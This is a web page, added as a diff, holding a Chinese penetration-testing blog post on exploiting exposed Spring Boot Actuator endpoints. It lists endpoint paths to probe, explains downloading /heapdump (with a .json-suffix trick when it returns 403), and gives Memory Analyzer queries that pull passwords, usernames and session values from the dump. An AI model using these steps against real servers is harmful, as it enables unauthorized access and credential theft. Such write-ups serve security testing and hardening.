@@ -1,0 +1,440 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Spring Boot Actuator漏洞复现 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  <meta name="description" content="0x01. 基本知识
+在pom.xml里面有这样的配置
+
+
+&amp;lt;dependency&amp;gt;
+   &amp;lt;groupId&amp;gt;org.springframework.boot&amp;lt;&amp;#x2F;groupId&amp;gt;
+   &amp;lt;artifactId&amp;gt;spring-boot-starter-actuator&amp;lt;&amp;#x2F;artifactId&amp;gt;
+   &amp;lt;exclusions&amp;gt;
+
+
+没有开启安全设置
+
+management:
+  security:
+    enabled: false
+  health:
+    elasticsearch:
+      enabled: false
+  metrics:
+    export:
+      prometheus:
+        enabled: true
+      jmx:
+        enabled: true
+  endpoints:
+    web:
+      exposure:
+        include: &amp;#39;*&amp;#39;
+      base-path: &amp;#x2F;auto
+服务端可以通过修改配置文件来改变Actuator的根路径：management.endpoints.web.base-path=/monitor
+  搜索github的源代码，可以看到类似的设置：
+0x02 漏洞利用在配置不当的时候，可能暴露以下路由:
+&amp;#x2F;actuator
+&amp;#x2F;auditevents
+&amp;#x2F;autoconfig
+&amp;#x2F;beans
+&amp;#x2F;caches
+&amp;#x2F;conditions
+&amp;#x2F;configprops
+&amp;#x2F;docs
+&amp;#x2F;dump
+&amp;#x2F;env
+&amp;#x2F;flyway
+&amp;#x2F;health
+&amp;#x2F;heapdump
+&amp;#x2F;httptrace
+&amp;#x2F;info
+&amp;#x2F;intergrationgraph
+&amp;#x2F;jolokia
+&amp;#x2F;logfile
+&amp;#x2F;loggers
+&amp;#x2F;liquibase
+&amp;#x2F;metrics
+&amp;#x2F;mappings
+&amp;#x2F;prometheus
+&amp;#x2F;refresh
+&amp;#x2F;scheduledtasks
+&amp;#x2F;sessions
+&amp;#x2F;shutdown
+&amp;#x2F;trace
+&amp;#x2F;threaddump
+&amp;#x2F;actuator&amp;#x2F;auditevents
+&amp;#x2F;actuator&amp;#x2F;beans
+&amp;#x2F;actuator&amp;#x2F;health
+&amp;#x2F;actuator&amp;#x2F;conditions
+&amp;#x2F;actuator&amp;#x2F;configprops
+&amp;#x2F;actuator&amp;#x2F;env
+&amp;#x2F;actuator&amp;#x2F;info
+&amp;#x2F;actuator&amp;#x2F;loggers
+&amp;#x2F;actuator&amp;#x2F;heapdump
+&amp;#x2F;actuator&amp;#x2F;threaddump
+&amp;#x2F;actuator&amp;#x2F;metrics
+&amp;#x2F;actuator&amp;#x2F;scheduledtasks
+&amp;#x2F;actuator&amp;#x2F;httptrace
+&amp;#x2F;actuator&amp;#x2F;mappings
+&amp;#x2F;actuator&amp;#x2F;jolokia
+&amp;#x2F;actuator&amp;#x2F;hystrix.stream"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Spring Boot Actuator漏洞复现"/>
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Spring Boot Actuator漏洞复现</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <h3 id="0x01-基本知识"><a href="#0x01-基本知识" class="headerlink" title="0x01. 基本知识"></a>0x01. 基本知识</h3><ol>
+<li>在pom.xml里面有这样的配置</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">
+&lt;dependency&gt;
+   &lt;groupId&gt;org.springframework.boot&lt;&#x2F;groupId&gt;
+   &lt;artifactId&gt;spring-boot-starter-actuator&lt;&#x2F;artifactId&gt;
+   &lt;exclusions&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<ol start="2">
+<li>没有开启安全设置</li>
+</ol>
+<pre class="line-numbers language-none"><code class="language-none">management:
+  security:
+    enabled: false
+  health:
+    elasticsearch:
+      enabled: false
+  metrics:
+    export:
+      prometheus:
+        enabled: true
+      jmx:
+        enabled: true
+  endpoints:
+    web:
+      exposure:
+        include: &#39;*&#39;
+      base-path: &#x2F;auto<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>服务端可以通过修改配置文件来改变Actuator的根路径：<code>management.endpoints.web.base-path=/monitor</code></p>
+<p>  搜索github的源代码，可以看到类似的设置：</p>
+<h3 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h3><p>在配置不当的时候，可能暴露以下路由:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;actuator
+&#x2F;auditevents
+&#x2F;autoconfig
+&#x2F;beans
+&#x2F;caches
+&#x2F;conditions
+&#x2F;configprops
+&#x2F;docs
+&#x2F;dump
+&#x2F;env
+&#x2F;flyway
+&#x2F;health
+&#x2F;heapdump
+&#x2F;httptrace
+&#x2F;info
+&#x2F;intergrationgraph
+&#x2F;jolokia
+&#x2F;logfile
+&#x2F;loggers
+&#x2F;liquibase
+&#x2F;metrics
+&#x2F;mappings
+&#x2F;prometheus
+&#x2F;refresh
+&#x2F;scheduledtasks
+&#x2F;sessions
+&#x2F;shutdown
+&#x2F;trace
+&#x2F;threaddump
+&#x2F;actuator&#x2F;auditevents
+&#x2F;actuator&#x2F;beans
+&#x2F;actuator&#x2F;health
+&#x2F;actuator&#x2F;conditions
+&#x2F;actuator&#x2F;configprops
+&#x2F;actuator&#x2F;env
+&#x2F;actuator&#x2F;info
+&#x2F;actuator&#x2F;loggers
+&#x2F;actuator&#x2F;heapdump
+&#x2F;actuator&#x2F;threaddump
+&#x2F;actuator&#x2F;metrics
+&#x2F;actuator&#x2F;scheduledtasks
+&#x2F;actuator&#x2F;httptrace
+&#x2F;actuator&#x2F;mappings
+&#x2F;actuator&#x2F;jolokia
+&#x2F;actuator&#x2F;hystrix.stream<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>可以通过<code>/heapdump</code>这个节点获取内存，然后使用<a target="_blank" rel="noopener" href="https://www.eclipse.org/mat/downloads.php">Memory Analyzer</a>分析内存，获取敏感信息，常用查询：</p>
+<pre class="line-numbers language-none"><code class="language-none">select * from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
+或
+select * from java.util.LinkedHashMap$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
+ 
+ 
+select* from java.util.Hashtable$Entry x WHERE(toString(x.key).contains(&quot;username&quot;))
+select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;password&quot;))
+select* from java.util.Hashtable$Entry x WHERE (toString(x.key).contains(&quot;url&quot;))
+select* from java.lang.String s WHERE toString(s) LIKE &quot;.*password.*&quot;
+select* from org.springframework.web.context.support.StandardServletEnvironment
+select* from java.lang.String s WHERE toString(s) LIKE &quot;.*SESSION.*&quot;
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><ul>
+<li>参考链接里面，当下载/heapdump是403的时候, <code>/heapdump.json</code>可以下载成功，这个在spring启动的时候可以看到路由，所有的节点信息都存在<code>.json</code>路径</li>
+</ul>
+<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul>
+<li><a target="_blank" rel="noopener" href="https://github.com/LandGrey/SpringBootVulExploit">SpringBootVulExploit</a></li>
+<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sJAyhQQvGqG-SliSGbhJNA">渗透大型菠菜网站鸭脖</a></li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2021/05/27/spring-boot-actuator.html" class="leancloud-visitors view" data-flag-title="Spring Boot Actuator漏洞复现">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a href="/2021/07/29/silverFish.html" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2021/04/06/defense-from-c2.html" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2021-05-27 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x01-%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-article-text">0x01. 基本知识</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#0x02-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-article-text">0x02 漏洞利用</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="toc-article-text">注意点</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-article-text">参考链接</span></a></li></ol>
+		</div>
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 JKme's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
